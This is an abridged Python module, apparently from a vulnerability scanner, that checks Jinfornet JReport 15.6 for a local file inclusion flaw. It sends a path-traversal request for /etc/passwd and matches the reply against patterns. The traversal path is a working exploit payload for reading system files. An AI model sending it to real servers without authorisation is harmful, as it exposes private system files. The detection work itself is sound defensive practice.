...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Jinfornet Jreport 15.6 - Local File Inclusion Detection',
        ...
        'severity': 'high',
        'tags': ['web', 'scanner', 'vulnerability', 'jreport', 'jinfornet', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/jreport/sendfile/help/../../../../../../../../../../../../../../etc/passwd', allow_redirects=False)
        ...
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='high',
                reason="Jinfornet Jreport 15.6 - Local File Inclusion detected",
